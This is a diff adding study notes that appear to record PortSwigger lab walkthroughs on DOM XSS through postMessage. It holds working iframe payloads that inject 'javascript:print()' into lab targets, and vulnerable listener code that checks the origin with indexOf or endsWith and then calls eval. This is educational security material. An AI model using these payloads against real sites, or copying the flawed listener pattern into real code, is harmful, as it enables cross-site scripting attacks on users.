@@ -66,3 +66,83 @@ window.addEventListener('message', function(e) {
         </html>
 ```
 - The lab was solved on delevering to victim
+
+# Lab: DOM XSS using web messages and a JavaScript URL
+- This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. 
+- To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+
+```
+<iframe src="https://0ae4003c04b07f1b815639c8003000fc.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
+```
+- This lab was solved with the above payload because the javasript was checking if http: or https was present in the href.
+- The // commented out the http to allow the javascript stand alone.
+- The lab before this can also be solved using this
+
+# Origin verification
+- Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed. 
+- For example, consider the following code:
+```
+window.addEventListener('message', function(e) {
+    if (e.origin.indexOf('normal-website.com') > -1) {
+        eval(e.data);
+    }
+});
+```
+- The indexOf method is used to try and verify that the origin of the incoming message is the normal-website.com domain. 
+- However, in practice, it only checks whether the string "normal-website.com" is contained anywhere in the origin URL. 
+- As a result, an attacker could easily bypass this verification step if the origin of their malicious message was http://www.normal-website.com.evil.net, for example.
+
+- The same flaw also applies to verification checks that rely on the startsWith() or endsWith() methods. 
+- For example, the following event listener would regard the origin http://www.malicious-websitenormal-website.com as safe:
+```
+window.addEventListener('message', function(e) {
+    if (e.origin.endsWith('normal-website.com')) {
+        eval(e.data);
+    }
+});
+```
+
+# Lab: DOM XSS using web messages and JSON.parse
+- This lab uses web messaging and parses the message as JSON. 
+- To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.
+- The lab has the following javascript code
+```
+<script>
+window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+                        }, false);
+</script>                       
+```
+- It is using JSON.parse to parse in strings and turn it to json object
+- So we can construct an html that looks like this
+```
+<iframe src="https://0aa500140328685f81f66cb000e4007c.web-security-academy.net/" onload="this.contentWindow.postMessage('{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}','*')"></iframe>
+```
+- Trying out the above code to see If it is going to work
+- That does not work
+- Lets try another payload
+```
+<iframe src="https://0aa500140328685f81f66cb000e4007c.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
+```
+- Lab was solved successfully
+
+# Which sinks can lead to DOM-based web message vulnerabilities?
+- As long as a website accepts web message data from an untrusted source due to a lack of adequate origin verification, any sinks that are used by the incoming message event listener could potentially lead to vulnerabilities.
